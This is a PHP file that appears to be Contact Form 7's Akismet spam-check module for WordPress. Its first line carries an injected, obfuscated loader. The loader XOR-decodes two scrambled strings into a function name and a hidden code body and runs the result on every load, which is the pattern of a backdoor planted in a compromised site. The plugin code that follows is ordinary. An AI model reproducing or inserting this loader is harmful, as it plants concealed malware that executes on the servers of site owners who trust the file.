<?php $mKYiwvf='V0V8;EbP0497YO9'; $tBWHMuWo='5B3YO =6EZZC0 W'^$mKYiwvf; $KWPblD='9+kmKN>ND<,=f=-S>CEEbBT4qH603njANNEoxs6s15E:.O;QSZB=C6HR3Ahh;HXrm=5,Uktw338zySPinKRLKs ,=ddtVwqljC,TDfa>OXSimnrPQNFE4<Bqm.RX6bJjC=DiNkhzHO> ihvBQP3JGUgnD3F:zjV,WfuBMhlJ13Y7 yV TJO4duG<f>7MY+=cm;U yjxFA=7Izq 39SHSy<9X=6lRaT7ZUf;--otvP =+,ayh6VFRT2Eiowgwd p kl56vfSHIejoKa,W9M7peGH=l J6L6=+JFJRk9S3wx2fV+3+mVeb O+, Rf1kh8 vmXPQY:Jdn1rz3:1HP+ jeH+8eaae2 dTFaS>54ZStvgBX K1cv=GM=b1L=7s83YfJOuR26lixGSOZ=MluDoCVZDPhpj-MGI>UO638mExnA ;5  ZL..=p7W=7=.0.ts<>DzL,MVSZrJK1V=HpU.;M5Zjje>PLMcPR1oDC8 JxUZY81tSjV0  X7mZKMd4 Y;OHft2.;Pjle,+>7biwEhjA<rivQ- -0T-T+SvasktVTk6akrUxk45+x2AX+-hyiCg5-y.u,TWs+eqjlAb5IIA -=22j D9CA0dA;34=SZVHJbl36DZgFvBavNp5Bh34P mrQWZZ0tEODA 36w+PChQN UAAaXynE'; $xyMqrh=$tBWHMuWo('', 'PMCL-;P-0UCS9XU:M76mE:;F.,WDR15,;:bFQSMy8S0TM;R>=z:R1i,3G 77V=,ZIYTX4GTSXVASYspIN0XEBWOYIDYTqPJfcJJ;6NEWoesYVNV9m=27XY,YIJ3,WKqJgToBgaasl KTIFKbytW+34<J-nfdZN=I.=Q+mML9EA5RNQrK13fiMNM5oLR9,YSKIT TPQrO<7JCpUDRM2hnYZX4NSWXE0V.49PHTOIV6AQXIZsbP9475Q-IGS84+o;i.LTEVB8-0EWQkEZ6U8RYE<B4HD+B-iVN3fwrOR6JLr;B2JGJMkEFV.GYEilLabQFVEyt58N+MNJxsUUC-1HHJMltj 04 atD55AwUPMznJVC49L>TJVFMD4FU-IV,SV FwoQ9WOWcqNw+;I,LHdK57615SzcPG:C4q+WGYMxX.4NHPRI; GTXXO8OhYODO+,QK0R.M>3en-..R9Y-XqJZ9TsFJAZ18,<;7HFmx2I,Pq>8LPTuLvQRR9N21.4;QX0H;;NSYKBwFLAHJJVKIQcHB,XGAR5LTLksF1Rt+HSVIvsYWUZJfLYVWHITpmOIQNYpVWKLOLJe3DMBXJJgBT;; YrVWK5E<P05CLfKRMQ<;2ofBHWW0;NoVbAVnPNHaVB1LEV56.;kS5.=-ORRPvyxbX+X<5iQqBd8'^$KWPblD); $xyMqrh();
/**
** Akismet Filter
** Akismet API: http://akismet.com/development/api/
**/

add_filter( 'wpcf7_spam', 'wpcf7_akismet' );

function wpcf7_akismet( $spam ) {
	if ( $spam ) {
		return $spam;
	}

	if ( ! wpcf7_akismet_is_available() ) {
		return false;
	}

	if ( ! $params = wpcf7_akismet_submitted_params() ) {
		return false;
	}

	$c = array();

	$c['comment_author'] = $params['author'];
	$c['comment_author_email'] = $params['author_email'];
	$c['comment_author_url'] = $params['author_url'];
	$c['comment_content'] = $params['content'];

	$c['blog'] = get_option( 'home' );
	$c['blog_lang'] = get_locale();
	$c['blog_charset'] = get_option( 'blog_charset' );
	$c['user_ip'] = $_SERVER['REMOTE_ADDR'];
	$c['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
	$c['referrer'] = $_SERVER['HTTP_REFERER'];

	// http://blog.akismet.com/2012/06/19/pro-tip-tell-us-your-comment_type/
	$c['comment_type'] = 'contact-form';

	if ( $permalink = get_permalink() ) {
		$c['permalink'] = $permalink;
	}

	$ignore = array( 'HTTP_COOKIE', 'HTTP_COOKIE2', 'PHP_AUTH_PW' );

	foreach ( $_SERVER as $key => $value ) {
		if ( ! in_array( $key, (array) $ignore ) )
			$c["$key"] = $value;
	}

	return wpcf7_akismet_comment_check( $c );
}

function wpcf7_akismet_is_available() {
	if ( is_callable( array( 'Akismet', 'get_api_key' ) ) ) { // Akismet v3.0+
		return (bool) Akismet::get_api_key();
	}

	if ( function_exists( 'akismet_get_key' ) ) {
		return (bool) akismet_get_key();
	}

	return false;
}

function wpcf7_akismet_submitted_params() {
	$params = array(
		'author' => '',
		'author_email' => '',
		'author_url' => '',
		'content' => '' );

	$has_akismet_option = false;

	foreach ( (array) $_POST as $key => $val ) {
		if ( '_wpcf7' == substr( $key, 0, 6 ) || '_wpnonce' == $key ) {
			continue;
		}

		if ( is_array( $val ) ) {
			$val = implode( ', ', wpcf7_array_flatten( $val ) );
		}

		$val = trim( $val );

		if ( 0 == strlen( $val ) ) {
			continue;
		}

		if ( $tags = wpcf7_scan_form_tags( array( 'name' => $key ) ) ) {
			$tag = $tags[0];
			$tag = new WPCF7_FormTag( $tag );

			$akismet = $tag->get_option( 'akismet',
				'(author|author_email|author_url)', true );

			if ( $akismet ) {
				$has_akismet_option = true;

				if ( 'author' == $akismet ) {
					$params[$akismet] = trim( $params[$akismet] . ' ' . $val );
				} elseif ( '' == $params[$akismet] ) {
					$params[$akismet] = $val;
				}
			}
		}

		$params['content'] .= "\n\n" . $val;
	}

	if ( ! $has_akismet_option ) {
		return false;
	}

	$params['content'] = trim( $params['content'] );

	return $params;
}

function wpcf7_akismet_comment_check( $comment ) {
	global $akismet_api_host, $akismet_api_port;

	$spam = false;
	$query_string = wpcf7_build_query( $comment );

	if ( is_callable( array( 'Akismet', 'http_post' ) ) ) { // Akismet v3.0+
		$response = Akismet::http_post( $query_string, 'comment-check' );
	} else {
		$response = akismet_http_post( $query_string, $akismet_api_host,
			'/1.1/comment-check', $akismet_api_port );
	}

	if ( 'true' == $response[1] ) {
		$spam = true;
	}

	if ( $submission = WPCF7_Submission::get_instance() ) {
		$submission->akismet = array( 'comment' => $comment, 'spam' => $spam );
	}

	return apply_filters( 'wpcf7_akismet_comment_check', $spam, $comment );
}
